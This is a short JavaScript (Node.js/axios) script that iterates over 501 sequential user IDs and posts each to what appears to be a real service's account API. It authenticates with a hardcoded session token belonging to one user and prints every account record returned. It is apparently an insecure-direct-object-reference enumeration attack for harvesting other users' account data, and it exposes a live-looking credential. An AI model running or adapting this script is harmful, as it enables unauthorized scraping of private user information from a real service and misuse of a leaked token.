const axios = require('axios');

const MIN_ID = 20001000;
const MAX_ID = 20001500;

for(let i = MIN_ID; i <= MAX_ID; i++){
    var data = JSON.stringify({
        "userId": i
    });

    var config = {
        method: 'post',
        url: 'https://api.joinfud.com/api/v1/user/account',
        headers: { 
            'x-token': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJGdWQiLCJzdWIiOiJGdWQiLCJleHAiOjE2NzQwNTI4NTEsImlhdCI6MTY3MTQ2MDg1MSwianRpIjoiV1FQQVpNIiwidXNlcklkIjoyMDAwNTUwMiwidXNlcm5hbWUiOiJnbXNvbmcifQ.VUze5uVwtHj90dddX9tHutU907xUy-B9lUgHGbafduY', 
            'Content-Type': 'application/json'
        },
        data : data
    };

    axios(config)
        .then(function (response) {
            console.log(JSON.stringify(response.data.data));
        })
        .catch(function (error) {
            console.log(error);
        });
}